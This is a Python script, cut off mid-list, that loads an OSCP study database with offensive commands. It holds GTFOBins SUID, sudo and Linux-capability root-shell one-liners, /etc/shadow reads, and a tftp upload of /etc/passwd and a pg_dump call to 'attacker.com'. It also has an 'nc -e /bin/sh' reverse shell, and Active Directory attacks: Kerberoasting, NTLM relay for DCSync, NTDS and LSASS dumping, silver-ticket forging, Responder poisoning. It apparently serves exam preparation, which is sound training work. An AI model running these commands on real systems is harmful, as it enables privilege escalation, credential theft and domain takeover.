#!/usr/bin/env python3
"""
##############################################
## Freeworld - Allergic to aluminum baby   ##
## OSCP Command DB - MASTER PATCH          ##
##############################################

Combines ALL patch files into one:
  - GTFOBins SUID escalation (full list)
  - GTFOBins SUDO escalation (full list)
  - GTFOBins CAPABILITIES escalation (NEW - cap_setuid, cap_dac_read_search, etc.)
  - OSCP-allowed tools (impacket, CME, BloodHound, kerbrute, responder, etc.)
  - NetExec (nxc), bloodyAD, Rubeus, ligolo, mimikatz extras
  - Database commands (MySQL, PostgreSQL, MSSQL, SQLite, Redis, MongoDB)
  - Log file reference entries (Windows + Linux)
  - Config file reference entries (Windows + Linux + PHP + Nginx)

Usage:
    python3 oscp_patch_all.py

Skips duplicates by exact command match - safe to re-run.
"""

import sqlite3
import os
import sys

DB_PATH = os.path.expanduser("~/.oscp_commands.db")

# ─────────────────────────────────────────────
# GTFOBINS — SUID
# ─────────────────────────────────────────────
gtfobins_suid = {
    "aria2c": 'COMMAND=id\nTF=$(mktemp)\necho "$COMMAND" > $TF\nchmod +x $TF\n./aria2c --on-download-error=$TF http://x',
    "arp": 'LFILE=file_to_read\n./arp -v -f "$LFILE"',
    "ash": './ash',
    "base64": 'LFILE=file_to_read\n./base64 "$LFILE" | base64 --decode',
    "bash": './bash -p',
    "busybox": './busybox sh',
    "cat": 'LFILE=file_to_read\n./cat "$LFILE"',
    "chmod": 'LFILE=file_to_change\n./chmod 6777 $LFILE',
    "chown": 'LFILE=file_to_change\n./chown $(id -u):$(id -g) $LFILE',
    "cp": 'LFILE=file_to_write\nTF=$(mktemp)\necho "DATA" > $TF\n./cp $TF $LFILE',
    "csh": './csh -b',
    "curl": 'LFILE=file_to_read\n./curl file://$LFILE',
    "dash": './dash -p',
    "date": 'LFILE=file_to_read\n./date -f $LFILE',
    "dd": 'LFILE=file_to_write\necho "data" | ./dd of=$LFILE',
    "diff": 'LFILE=file_to_read\n./diff --line-format=%L /dev/null $LFILE',
    "docker": './docker run -v /:/mnt --rm -it alpine chroot /mnt sh',
    "ed": './ed\n!/bin/sh',
    "emacs": './emacs -Q -nw --eval \'(term "/bin/sh -p")\'',
    "env": './env /bin/sh -p',
    "expand": 'LFILE=file_to_read\n./expand "$LFILE"',
    "expect": './expect -c "spawn /bin/sh -p;interact"',
    "file": 'LFILE=file_to_read\n./file -f $LFILE',
    "find": './find . -exec /bin/sh -p \\; -quit',
    "flock": './flock -u / /bin/sh -p',
    "fmt": 'LFILE=file_to_read\n./fmt -999 "$LFILE"',
    "fold": 'LFILE=file_to_read\n./fold -w99999999 "$LFILE"',
    "gawk": './gawk \'BEGIN {system("/bin/sh")}\'',
    "gdb": './gdb -nx -ex \'python import os; os.execl("/bin/sh", "sh", "-p")\' -ex quit',
    "gimp": './gimp -idf --batch-interpreter=python-fu-eval -b \'import os; os.execl("/bin/sh", "sh", "-p")\'',
    "grep": 'LFILE=file_to_read\n./grep \'\' $LFILE',
    "head": 'LFILE=file_to_read\n./head -c1G "$LFILE"',
    "ionice": './ionice /bin/sh -p',
    "ip": 'LFILE=file_to_read\n./ip -force -batch $LFILE',
    "jq": 'LFILE=file_to_read\n./jq -Rr . "$LFILE"',
    "ksh": './ksh -p',
    "ld.so": './ld.so /bin/sh -p',
    "less": './less file_to_read\n!/bin/sh',
    "logsave": './logsave /dev/null /bin/sh -i -p',
    "lua": './lua -e \'os.execute("/bin/sh -p")\'',
    "make": 'COMMAND=\'/bin/sh -p\'\n./make -s --eval=$\'x:\\n\\t-\'$COMMAND',
    "more": './more file_to_read\n!/bin/sh',
    "mv": 'LFILE=file_to_write\nTF=$(mktemp)\necho "DATA" > $TF\n./mv $TF $LFILE',
    "nano": './nano\n^R^X\nreset; sh -p 1>&0 2>&0',
    "nawk": './nawk \'BEGIN {system("/bin/sh")}\'',
    "nice": './nice /bin/sh -p',
    "nl": 'LFILE=file_to_read\n./nl -bn -w1 -s \'\' $LFILE',
    "nmap": 'TF=$(mktemp)\necho \'os.execute("/bin/sh")\' > $TF\n./nmap --script=$TF',
    "node": './node -e \'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]})\'',
    "od": 'LFILE=file_to_read\n./od -An -c -w9999 "$LFILE"',
    "openssl": 'LFILE=file_to_read\n./openssl enc -in "$LFILE"',
    "perl": './perl -e \'exec "/bin/sh";\'',
    "php": './php -r "pcntl_exec(\'/bin/sh\', [\'-p\']);"',
    "python": './python -c \'import os; os.execl("/bin/sh", "sh", "-p")\'',
    "python3": './python3 -c \'import os; os.execl("/bin/sh", "sh", "-p")\'',
    "rlwrap": './rlwrap -H /dev/null /bin/sh -p',
    "rpm": './rpm --eval \'%{lua:os.execute("/bin/sh", "-p")}\'',
    "rpmquery": './rpmquery --eval \'%{lua:posix.exec("/bin/sh", "-p")}\'',
    "rsync": './rsync -e \'sh -p -c "sh 0<&2 1>&2"\' 127.0.0.1:/dev/null',
    "ruby": './ruby -e \'exec "/bin/sh"\'',
    "run-parts": './run-parts --new-session --regex \'^sh$\' /bin --arg=\'-p\'',
    "rvim": './rvim -c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\'',
    "sed": './sed -n \'1e exec sh -p 1>&0\' /etc/hosts',
    "setarch": './setarch $(arch) /bin/sh -p',
    "shuf": 'LFILE=file_to_read\n./shuf -e "$LFILE"',
    "socat": './socat stdin exec:/bin/sh,pty,stderr,setsid,sigint,sane',
    "sort": 'LFILE=file_to_read\n./sort -m "$LFILE"',
    "sqlite3": './sqlite3 /dev/null \'.shell /bin/sh -p\'',
    "ssh": './ssh -o ProxyCommand=\';sh -p 0<&2 1>&2\' x',
    "start-stop-daemon": './start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p',
    "stdbuf": './stdbuf -i0 /bin/sh -p',
    "strace": './strace -o /dev/null /bin/sh -p',
    "systemctl": 'TF=$(mktemp).service\necho \'[Service]\nType=oneshot\nExecStart=/bin/sh -c "id > /tmp/output"\n[Install]\nWantedBy=multi-user.target\' > $TF\n./systemctl link $TF\n./systemctl enable --now $TF',
    "tail": 'LFILE=file_to_read\n./tail -c1G "$LFILE"',
    "tar": './tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh',
    "taskset": './taskset 1 /bin/sh -p',
    "tee": 'LFILE=file_to_write\necho DATA | ./tee -a "$LFILE"',
    "time": './time /bin/sh -p',
    "timeout": './timeout 7d /bin/sh -p',
    "ul": 'LFILE=file_to_read\n./ul "$LFILE"',
    "unexpand": 'LFILE=file_to_read\n./unexpand -t99999999 "$LFILE"',
    "uniq": 'LFILE=file_to_read\n./uniq "$LFILE"',
    "unshare": './unshare -r /bin/sh',
    "vi": './vi -c \':!/bin/sh\' /dev/null',
    "vim": './vim -c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\' /dev/null',
    "watch": './watch -x sh -p -c \'reset; exec sh -p 1>&0 2>&0\'',
    "wget": 'LFILE=file_to_read\n./wget -i $LFILE',
    "xargs": './xargs -a /dev/null sh -p',
    "xxd": 'LFILE=file_to_read\n./xxd "$LFILE" | xxd -r',
    "zip": 'TF=$(mktemp -u)\n./zip $TF /etc/hosts -T -TT \'sh -p #\'\nrm $TF',
    "zsh": './zsh',
    # Additional SUID not in original patch
    "awk": './awk \'BEGIN {system("/bin/sh -p")}\'',
    "cpulimit": './cpulimit -l 100 -f -- /bin/sh -p',
    "cut": 'LFILE=file_to_read\n./cut -d "" -f1 "$LFILE"',
    "dmesg": './dmesg -H\n!/bin/sh',
    "dpkg": './dpkg -l\n!/bin/sh',
    "ftp": './ftp\n!/bin/sh -p',
    "git": './git help status\n!/bin/sh -p',
    "gtester": './gtester -q --keep-going /bin/sh',
    "hd": 'LFILE=file_to_read\n./hd "$LFILE"',
    "iconv": 'LFILE=file_to_read\n./iconv -f 8859_1 -t 8859_1 "$LFILE"',
    "install": 'LFILE=file_to_write\n./install -m 0777 /dev/null $LFILE',
    "kubectl": './kubectl run r00t --restart=Never -ti --rm --image lol --overrides \'{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}\'',
    "man": './man man\n!/bin/sh -p',
    "mtr": './mtr --program /bin/sh -p .',
    "mv": 'LFILE=file_to_write\nTF=$(mktemp)\necho "DATA" > $TF\n./mv $TF $LFILE',
    "mysql": './mysql -e \'\! /bin/sh\'',
    "nohup": './nohup /bin/sh -p -c "sh -p <$(tty) >$(tty) 2>$(tty)"',
    "nsenter": './nsenter -t 1 -m -u -i -n /bin/bash -p',
    "pdb": './pdb\nimport os; os.execl("/bin/sh", "sh", "-p")',
    "pg_dump": 'RHOST=attacker.com\nRPORT=12345\ncd /tmp\n./pg_dump -h $RHOST -p $RPORT -U x -f /dev/null postgres',
    "restic": 'RHOST=localhost\nRPORT=12345\n./restic backup -r sftp:${RHOST}:${RPORT}/x /etc',
    "run-mailcap": './run-mailcap --action=view /etc/hosts\n!/bin/sh -p',
    "scanmem": 'echo shell | ./scanmem',
    "screen": './screen',
    "script": './script -q /dev/null\nexec /bin/sh -p <$(tty) >$(tty) 2>$(tty)',
    "service": './service ../../bin/sh -p',
    "snap": 'COMMAND=\'/bin/bash\'\ncd $(mktemp -d)\nmkdir meta\ncat > meta/snap.yaml <<EOF\nname: test\nversion: 1\narchitectures: [amd64]\nEOF\nchmod a+x $COMMAND\nsnap pack .\n./snap install test_1_amd64.snap --dangerous --devmode',
    "suid3num": '# Run suid3num.py to find SUID escalation paths: python3 suid3num.py',
    "taskset": './taskset 1 /bin/sh -p',
    "tclsh": './tclsh\nexec /bin/sh -p <@stdin >@stdout 2>@stderr',
    "tee": 'LFILE=file_to_write\necho DATA | ./tee -a "$LFILE"',
    "tftp": 'RHOST=attacker.com\n./tftp $RHOST\nput /etc/passwd',
    "ul": 'LFILE=file_to_read\n./ul "$LFILE"',
    "xmore": 'LFILE=file_to_read\n./xmore $LFILE',
    "yash": './yash',
}

# ─────────────────────────────────────────────
# GTFOBINS — SUDO
# ─────────────────────────────────────────────
gtfobins_sudo = {
    "aria2c": 'COMMAND=id\nTF=$(mktemp)\necho "$COMMAND" > $TF\nchmod +x $TF\nsudo aria2c --on-download-error=$TF http://x',
    "arp": 'LFILE=file_to_read\nsudo arp -v -f "$LFILE"',
    "ash": 'sudo ash',
    "awk": 'sudo awk \'BEGIN {system("/bin/sh")}\'',
    "base64": 'LFILE=file_to_read\nsudo base64 "$LFILE" | base64 --decode',
    "bash": 'sudo bash',
    "busybox": 'sudo busybox sh',
    "cat": 'LFILE=file_to_read\nsudo cat "$LFILE"',
    "chmod": 'LFILE=file_to_change\nsudo chmod 6777 $LFILE',
    "chown": 'LFILE=file_to_change\nsudo chown $(id -u):$(id -g) $LFILE',
    "cp": 'LFILE=file_to_write\nTF=$(mktemp)\necho "DATA" > $TF\nsudo cp $TF $LFILE',
    "csh": 'sudo csh',
    "curl": 'LFILE=file_to_read\nsudo curl file://$LFILE',
    "cut": 'LFILE=file_to_read\nsudo cut -d "" -f1 "$LFILE"',
    "dash": 'sudo dash',
    "date": 'LFILE=file_to_read\nsudo date -f $LFILE',
    "dd": 'LFILE=file_to_write\necho "data" | sudo dd of=$LFILE',
    "diff": 'LFILE=file_to_read\nsudo diff --line-format=%L /dev/null $LFILE',
    "docker": 'sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh',
    "ed": 'sudo ed\n!/bin/sh',
    "emacs": 'sudo emacs -Q -nw --eval \'(term "/bin/sh")\'',
    "env": 'sudo env /bin/sh',
    "expand": 'LFILE=file_to_read\nsudo expand "$LFILE"',
    "expect": 'sudo expect -c "spawn /bin/sh;interact"',
    "file": 'LFILE=file_to_read\nsudo file -f $LFILE',
    "find": 'sudo find . -exec /bin/sh \\; -quit',
    "flock": 'sudo flock -u / /bin/sh',
    "fmt": 'LFILE=file_to_read\nsudo fmt -999 "$LFILE"',
    "fold": 'LFILE=file_to_read\nsudo fold -w99999999 "$LFILE"',
    "gawk": 'sudo gawk \'BEGIN {system("/bin/sh")}\'',
    "gdb": 'sudo gdb -nx -ex \'!sh\' -ex quit',
    "gimp": 'sudo gimp -idf --batch-interpreter=python-fu-eval -b \'import os; os.system("sh")\'',
    "git": 'sudo git -p help\n!/bin/sh',
    "grep": 'LFILE=file_to_read\nsudo grep \'\' $LFILE',
    "head": 'LFILE=file_to_read\nsudo head -c1G "$LFILE"',
    "ionice": 'sudo ionice /bin/sh',
    "ip": 'LFILE=file_to_read\nsudo ip -force -batch $LFILE',
    "jq": 'LFILE=file_to_read\nsudo jq -Rr . "$LFILE"',
    "ksh": 'sudo ksh',
    "less": 'sudo less /etc/profile\n!/bin/sh',
    "logsave": 'sudo logsave /dev/null /bin/sh -i',
    "lua": 'sudo lua -e \'os.execute("/bin/sh")\'',
    "make": 'COMMAND=\'/bin/sh\'\nsudo make -s --eval=$\'x:\\n\\t-\'$COMMAND',
    "man": 'sudo man man\n!/bin/sh',
    "more": 'sudo more /etc/profile\n!/bin/sh',
    "mv": 'LFILE=file_to_write\nTF=$(mktemp)\necho "DATA" > $TF\nsudo mv $TF $LFILE',
    "mysql": 'sudo mysql -e \'\! /bin/sh\'',
    "nano": 'sudo nano\n^R^X\nreset; sh 1>&0 2>&0',
    "nawk": 'sudo nawk \'BEGIN {system("/bin/sh")}\'',
    "nice": 'sudo nice /bin/sh',
    "nl": 'LFILE=file_to_read\nsudo nl -bn -w1 -s \'\' $LFILE',
    "nmap": 'TF=$(mktemp)\necho \'os.execute("/bin/sh")\' > $TF\nsudo nmap --script=$TF',
    "node": 'sudo node -e \'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})\'',
    "od": 'LFILE=file_to_read\nsudo od -An -c -w9999 "$LFILE"',
    "openssl": 'LFILE=file_to_read\nsudo openssl enc -in "$LFILE"',
    "perl": 'sudo perl -e \'exec "/bin/sh";\'',
    "php": 'CMD="/bin/sh"\nsudo php -r "system(\'$CMD\');"',
    "python": 'sudo python -c \'import os; os.system("/bin/sh")\'',
    "python3": 'sudo python3 -c \'import os; os.system("/bin/sh")\'',
    "rlwrap": 'sudo rlwrap /bin/sh',
    "rpm": 'sudo rpm --eval \'%{lua:os.execute("/bin/sh")}\'',
    "rpmquery": 'sudo rpmquery --eval \'%{lua:posix.exec("/bin/sh")}\'',
    "rsync": 'sudo rsync -e \'sh -c "sh 0<&2 1>&2"\' 127.0.0.1:/dev/null',
    "ruby": 'sudo ruby -e \'exec "/bin/sh"\'',
    "run-parts": 'sudo run-parts --new-session --regex \'^sh$\' /bin',
    "rvim": 'sudo rvim -c \':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")\'',
    "sed": 'sudo sed -n \'1e exec sh 1>&0\' /etc/hosts',
    "setarch": 'sudo setarch $(arch) /bin/sh',
    "shuf": 'LFILE=file_to_read\nsudo shuf -e "$LFILE"',
    "socat": 'sudo socat stdin exec:/bin/sh',
    "sort": 'LFILE=file_to_read\nsudo sort -m "$LFILE"',
    "sqlite3": 'sudo sqlite3 /dev/null \'.shell /bin/sh\'',
    "ssh": 'sudo ssh -o ProxyCommand=\';sh 0<&2 1>&2\' x',
    "start-stop-daemon": 'sudo start-stop-daemon -n $RANDOM -S -x /bin/sh',
    "stdbuf": 'sudo stdbuf -i0 /bin/sh',
    "strace": 'sudo strace -o /dev/null /bin/sh',
    "systemctl": 'TF=$(mktemp).service\necho \'[Service]\nType=oneshot\nExecStart=/bin/sh -c "id > /tmp/output"\n[Install]\nWantedBy=multi-user.target\' > $TF\nsudo systemctl link $TF\nsudo systemctl enable --now $TF',
    "tail": 'LFILE=file_to_read\nsudo tail -c1G "$LFILE"',
    "tar": 'sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh',
    "taskset": 'sudo taskset 1 /bin/sh',
    "tee": 'LFILE=file_to_write\necho DATA | sudo tee -a "$LFILE"',
    "time": 'sudo time /bin/sh',
    "timeout": 'sudo timeout 7d /bin/sh',
    "ul": 'LFILE=file_to_read\nsudo ul "$LFILE"',
    "unexpand": 'LFILE=file_to_read\nsudo unexpand -t99999999 "$LFILE"',
    "uniq": 'LFILE=file_to_read\nsudo uniq "$LFILE"',
    "unshare": 'sudo unshare -r /bin/sh',
    "vi": 'sudo vi -c \':!/bin/sh\' /dev/null',
    "vim": 'sudo vim -c \':!/bin/sh\'',
    "watch": 'sudo watch -x sh -c \'reset; exec sh 1>&0 2>&0\'',
    "wget": 'LFILE=file_to_read\nsudo wget -i $LFILE',
    "xargs": 'sudo xargs -a /dev/null sh',
    "xxd": 'LFILE=file_to_read\nsudo xxd "$LFILE" | xxd -r',
    "zip": 'TF=$(mktemp -u)\nsudo zip $TF /etc/hosts -T -TT \'sh #\'\nsudo rm $TF',
    "zsh": 'sudo zsh',
    # Additional SUDO not in original
    "apt": 'sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh',
    "apt-get": 'sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh',
    "cpan": 'sudo cpan\n! exec "/bin/sh"',
    "docker": 'sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh',
    "easy_install": 'TF=$(mktemp -d)\necho "import os; os.execl(\'/bin/sh\', \'sh\', \'-c\', \'sh <$(tty) >$(tty) 2>$(tty)\')" > $TF/setup.py\nsudo easy_install $TF',
    "finger": 'LFILE=file_to_read\nsudo finger -l @<(cat $LFILE)',
    "ftp": 'sudo ftp\n!/bin/sh',
    "gcc": 'sudo gcc -wrapper /bin/sh,-s .',
    "ionice": 'sudo ionice /bin/sh',
    "irssi": 'sudo irssi\n/exec -o /bin/sh',
    "irb": 'sudo irb\nexec "/bin/sh"',
    "jjs": 'echo "Java.type(\'java.lang.Runtime\').getRuntime().exec(\'/bin/sh\').waitFor()" | sudo jjs',
    "jrunscript": 'sudo jrunscript -e "exec(\'/bin/sh -c \\\\\"sh <$(tty) >$(tty) 2>$(tty)\\\\\"\')"',
    "knife": 'sudo knife exec -E \'exec "/bin/sh"\'',
    "ldconfig": 'sudo ldconfig -f /tmp/ldconfig.conf',
    "ltrace": 'sudo ltrace -b -L /bin/sh',
    "msgfilter": 'echo x | sudo msgfilter -P /bin/sh -c \'exec /bin/sh 1>&0\'',
    "multitime": 'sudo multitime /bin/sh',
    "nc": 'sudo nc -e /bin/sh localhost 4444  # on attacker: nc -lvp 4444',
    "pip": 'TF=$(mktemp -d)\necho "import os; os.execl(\'/bin/sh\', \'sh\', \'-c\', \'sh <$(tty) >$(tty) 2>$(tty)\')" > $TF/setup.py\nsudo pip install $TF',
    "pip3": 'TF=$(mktemp -d)\necho "import os; os.execl(\'/bin/sh\', \'sh\', \'-c\', \'sh <$(tty) >$(tty) 2>$(tty)\')" > $TF/setup.py\nsudo pip3 install $TF',
    "rake": 'sudo rake -p \'exec "/bin/sh"\'',
    "screen": 'sudo screen',
    "script": 'sudo script -q /dev/null',
    "service": 'sudo service ../../bin/sh',
    "sl": 'sudo sl -e exec /bin/sh',
    "ssh-keygen": 'sudo ssh-keygen -D $(echo "id_rsa" | xxd -ps | tr -d \'\\n\')',
    "ssh-keyscan": 'sudo ssh-keyscan -f /etc/passwd localhost',
    "sshpass": 'sudo sshpass /bin/sh',
    "svn": 'sudo svn -q --force export https://svn.example.org/trunk/ .\n!/bin/sh',
    "tclsh": 'sudo tclsh\nexec /bin/sh <@stdin >@stdout 2>@stderr',
    "tmux": 'sudo tmux',
    "uudecode": 'LFILE=file_to_read\nsudo uudecode -o /dev/stdout $LFILE',
    "uuencode": 'LFILE=file_to_read\nsudo uuencode "$LFILE" /dev/stdout | uudecode',
    "valgrind": 'sudo valgrind /bin/sh',
    "wget2": 'LFILE=file_to_read\nsudo wget2 -i $LFILE -O-',
    "xdotool": 'sudo xdotool exec --sync /bin/sh',
    "yarn": 'sudo yarn --cwd /tmp node /bin/sh',
    "yum": 'sudo yum localinstall --nogpgcheck /tmp/evil.rpm',
    "zmap": 'sudo zmap -x 1 -B 100K -i lo -o /tmp/out 127.0.0.1/8 -p 80',
}

# ─────────────────────────────────────────────
# GTFOBINS — CAPABILITIES (NEW)
# These are the ones that show up in: getcap -r / 2>/dev/null
# The key privesc ones are cap_setuid and cap_dac_read_search
# ─────────────────────────────────────────────
gtfobins_caps = {
    # cap_setuid — can call setuid(0) to become root
    "python": (
        "cap_setuid",
        '/path/to/python -c \'import os; os.setuid(0); os.system("/bin/bash")\''
    ),
    "python3": (
        "cap_setuid",
        '/path/to/python3 -c \'import os; os.setuid(0); os.system("/bin/bash")\''
    ),
    "perl": (
        "cap_setuid",
        '/path/to/perl -e \'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";\''
    ),
    "ruby": (
        "cap_setuid",
        '/path/to/ruby -e \'Process::Sys.setuid(0); exec "/bin/bash"\''
    ),
    "node": (
        "cap_setuid",
        '/path/to/node -e \'process.setuid(0); require("child_process").spawn("/bin/bash", {stdio: [0, 1, 2]})\''
    ),
    "php": (
        "cap_setuid",
        '/path/to/php -r "posix_setuid(0); system(\'/bin/bash\');"'
    ),
    "gdb": (
        "cap_setuid",
        '/path/to/gdb -nx -ex \'python import os; os.setuid(0)\' -ex \'!bash\' -ex quit'
    ),
    "vim": (
        "cap_setuid",
        '/path/to/vim -c \':py import os; os.setuid(0); os.execl("/bin/bash", "bash", "-c", "reset; exec bash")\''
    ),
    "rvim": (
        "cap_setuid",
        '/path/to/rvim -c \':py import os; os.setuid(0); os.execl("/bin/bash", "bash", "-c", "reset; exec bash")\''
    ),
    "lua": (
        "cap_setuid",
        # lua uses C-level calls via ffi if available, otherwise limited
        '# lua cap_setuid requires luaposix or ffi; try: /path/to/lua -e \'require("posix").setuid(0)\' then exec shell'
    ),
    "nice": (
        "cap_setuid",
        # nice itself can't setuid, but if it has cap_setuid it can be chained
        '/path/to/nice -n -20 /bin/bash  # cap_setuid alone may not help here; combine with setuid(0) in a wrapper'
    ),
    "setarch": (
        "cap_setuid",
        '/path/to/setarch $(arch) /bin/bash'
    ),
    # cap_dac_read_search — can read any file ignoring permissions (shadow, keys, etc.)
    "tar_dac": (
        "cap_dac_read_search",
        '/path/to/tar xf /etc/shadow -I\'cat\'  # or: /path/to/tar -czf /tmp/etc.tar.gz /etc/shadow && cat /tmp/etc.tar.gz | tar xz -O'
    ),
    "python_dac": (
        "cap_dac_read_search",
        '/path/to/python3 -c \'print(open("/etc/shadow").read())\''
    ),
    "perl_dac": (
        "cap_dac_read_search",
        '/path/to/perl -e \'open(F, "/etc/shadow") or die; print while <F>;\''
    ),
    "ruby_dac": (
        "cap_dac_read_search",
        '/path/to/ruby -e \'puts File.read("/etc/shadow")\''
    ),
    "node_dac": (
        "cap_dac_read_search",
        '/path/to/node -e \'console.log(require("fs").readFileSync("/etc/shadow","utf8"))\''
    ),
    "find_dac": (
        "cap_dac_read_search",
        'LFILE=/etc/shadow\n/path/to/find $LFILE -maxdepth 0 -exec cat {} \\;'
    ),
    # cap_net_raw — raw sockets; useful for sniffing, less useful for privesc
    "python_netraw": (
        "cap_net_raw",
        '# cap_net_raw allows raw socket sniffing — use scapy:\n/path/to/python3 -c \'from scapy.all import *; sniff(prn=lambda x: x.show())\''
    ),
    "tcpdump": (
        "cap_net_raw",
        '/path/to/tcpdump -i any -w /tmp/capture.pcap  # capture all traffic for credential extraction'
    ),
    # cap_sys_admin — very broad, can mount filesystems
    "python_sysadmin": (
        "cap_sys_admin",
        '# cap_sys_admin: can mount, pivot namespaces, etc.\n/path/to/python3 -c \'import ctypes; ctypes.CDLL(None).mount(b"overlay", b"/tmp/overlay", b"overlay", 0, b"lowerdir=/,upperdir=/tmp/upper,workdir=/tmp/work")\''
    ),
    # cap_sys_ptrace — attach to processes, inject shellcode
    "python_ptrace": (
        "cap_sys_ptrace",
        '# cap_sys_ptrace: inject into root process\n# Use python-ptrace or gdb to attach to a root process and inject shellcode'
    ),
    "gdb_ptrace": (
        "cap_sys_ptrace",
        '# cap_sys_ptrace + gdb: attach to root-owned process\n/path/to/gdb -p $(pgrep -f <ROOT_PROCESS>)\n# inside gdb: call (void)system("/bin/bash")'
    ),
}

# ─────────────────────────────────────────────
# OSCP-ALLOWED TOOLS (from add_oscp_oscp_allowed.py)
# ─────────────────────────────────────────────
OSCP_ALLOWED = [
    # impacket extras
    ("impacket", "GetUserSPNs with Kerberos auth (TGT loaded in KRB5CCNAME)",
     "impacket-GetUserSPNs -k -no-pass -dc-ip <DC_IP> <DOMAIN>/<USER>@<DC_FQDN> -request",
     "impacket", "impacket,kerberoast,kerberos,ccache"),
    ("impacket", "GetUserSPNs to file in hashcat format",
     "impacket-GetUserSPNs <DOMAIN>/<USER>:'<PASS>' -dc-ip <DC_IP> -request -outputfile kerb_hashes.txt",
     "impacket", "impacket,kerberoast,hashcat,spn"),
    ("impacket", "Targeted Kerberoast for one user (after SPN write)",
     "impacket-GetUserSPNs <DOMAIN>/<USER>:'<PASS>' -dc-ip <DC_IP> -request-user <TARGET>",
     "impacket", "impacket,kerberoast,targeted,spn"),
    ("impacket", "ntlmrelayx with SOCKS for relay+pivoting",
     "impacket-ntlmrelayx -tf targets.txt -smb2support -socks",
     "impacket", "impacket,ntlmrelay,socks,relay"),
    ("impacket", "ntlmrelayx LDAP relay to grant DCSync rights",
     "impacket-ntlmrelayx -t ldaps://<DC> --escalate-user <YOUR_USER> -smb2support",
     "impacket", "impacket,ntlmrelay,ldap,dcsync"),
    ("impacket", "ntlmrelayx with auto-execute on relay target",
     "impacket-ntlmrelayx -t smb://<TARGET> -c 'whoami' -smb2support",
     "impacket", "impacket,ntlmrelay,exec,smb"),
    ("impacket", "lookupsid via null session (anon enum)",
     "impacket-lookupsid <DOMAIN>/''@<IP> 20000",
     "impacket", "impacket,lookupsid,null,anonymous"),
    ("impacket", "MSSQL with Windows auth + xp_cmdshell",
     "impacket-mssqlclient <DOMAIN>/<USER>:'<PASS>'@<IP> -windows-auth   # then: enable_xp_cmdshell; xp_cmdshell whoami",
     "impacket", "impacket,mssql,xpcmdshell,exec"),
    ("impacket", "Forge silver ticket for a specific service",
     "impacket-ticketer -nthash <SERVICE_NTHASH> -domain-sid <SID> -domain <FQDN> -spn cifs/<TARGET> -user-id 500 Administrator",
     "impacket", "impacket,silver,ticket,spn"),
    # CrackMapExec
    ("crackmapexec", "List SMB shares",
     "crackmapexec smb <IP> -u <USER> -p '<PASS>' --shares",
     "ad", "cme,crackmapexec,smb,shares"),
    ("crackmapexec", "Enum domain users via SMB",
     "crackmapexec smb <IP> -u <USER> -p '<PASS>' --users",
     "ad", "cme,crackmapexec,smb,users"),
    ("crackmapexec", "Password policy enum",
     "crackmapexec smb <IP> -u <USER> -p '<PASS>' --pass-pol",
     "ad", "cme,crackmapexec,passpol,smb"),
    ("crackmapexec", "Dump NTDS via SMB (needs DA)",
     "crackmapexec smb <IP> -u <USER> -p '<PASS>' --ntds",
     "ad", "cme,crackmapexec,ntds,dcsync"),
    ("crackmapexec", "LSASS dump module via SMB",
     "crackmapexec smb <IP> -u <USER> -p '<PASS>' -M lsassy",
     "ad", "cme,crackmapexec,lsassy,lsass"),
    ("crackmapexec", "LDAP kerberoast",
     "crackmapexec ldap <IP> -u <USER> -p '<PASS>' --kerberoasting kerb.txt",
     "ad", "cme,crackmapexec,kerberoast,ldap"),
    ("crackmapexec", "LDAP asreproast",
     "crackmapexec ldap <IP> -u <USER> -p '<PASS>' --asreproast asrep.txt",
     "ad", "cme,crackmapexec,asrep,roast,ldap"),
    ("crackmapexec", "BloodHound collection via LDAP",
     "crackmapexec ldap <IP> -u <USER> -p '<PASS>' --bloodhound --collection All --dns-server <IP>",
     "ad", "cme,crackmapexec,bloodhound,ldap"),
    # BloodHound
    ("bloodhound", "Start Neo4j (required for BloodHound)",
     "sudo neo4j start",
     "ad", "bloodhound,neo4j,setup"),
    ("bloodhound", "Bloodhound-python via Kerberos ticket",
     "KRB5CCNAME=ticket.ccache bloodhound-python -u <USER> -k --no-pass -d <DOMAIN> -dc <DC_FQDN> -ns <IP> -c All --zip",
     "ad", "bloodhound,python,kerberos,ccache"),
    ("bloodhound", "Useful Cypher: find shortest path from owned to DA",
     "MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:'DOMAIN ADMINS@<DOMAIN>'})) RETURN p",
     "ad", "bloodhound,cypher,query,da"),
    # Kerbrute
    ("kerbrute", "User enum with seclists names file",
     "kerbrute userenum -d <DOMAIN> --dc <IP> /usr/share/seclists/Usernames/Names/names.txt -o users_found.txt",
     "ad", "kerbrute,userenum,seclists"),
    ("kerbrute", "User enum with xato top 10M usernames",
     "kerbrute userenum -d <DOMAIN> --dc <IP> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt",
     "ad", "kerbrute,userenum,xato"),
    ("kerbrute", "Single-user single-password attempt",
     "kerbrute bruteuser -d <DOMAIN> --dc <IP> passwords.txt <USER>",
     "ad", "kerbrute,brute,user"),
    # Responder
    ("responder", "Run with WPAD, Force LM, Verbose",
     "sudo responder -I <IFACE> -w -v",
     "ad", "responder,wpad,llmnr,poison"),
    ("responder", "Analyze mode (passive, no poisoning)",
     "sudo responder -I <IFACE> -A",
     "ad", "responder,analyze,passive"),
    ("responder", "Cracked hashes location",
     "ls /usr/share/responder/logs/   # NetNTLMv2 hashes -> hashcat -m 5600",
     "ad", "responder,hashes,logs"),
    ("responder", "Disable SMB/HTTP for ntlmrelayx co-existence",
     "# Edit /etc/responder/Responder.conf: SMB=Off, HTTP=Off",
     "ad", "responder,config,ntlmrelayx"),
    # smbmap extras
    ("smbmap", "Recursive share spider with pattern match",
